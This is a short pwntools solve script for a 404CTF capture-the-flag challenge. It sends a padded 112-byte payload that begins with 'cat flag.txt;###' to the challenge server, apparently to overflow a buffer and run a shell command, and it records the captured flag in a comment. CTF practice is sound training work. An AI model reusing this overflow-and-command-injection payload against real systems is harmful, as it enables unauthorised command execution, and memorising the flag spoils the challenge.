from pwn import *

r = remote('challenges.404ctf.fr', 31958)
# s = b'cat flag.txt;###' + b'gagne'*19 + b'\x00'
s = b'cat flag.txt;###gagnegagnegagnegagnegagnegagnegagnegagnegagnegagnegagnegagnegagnegagnegagnegagnegagnegagnegagne\x00'
assert len(s) == 112

r.recvline()
r.recvline()
r.sendline(s)
r.recvline()

# 404CTF{0v3rfl0w}
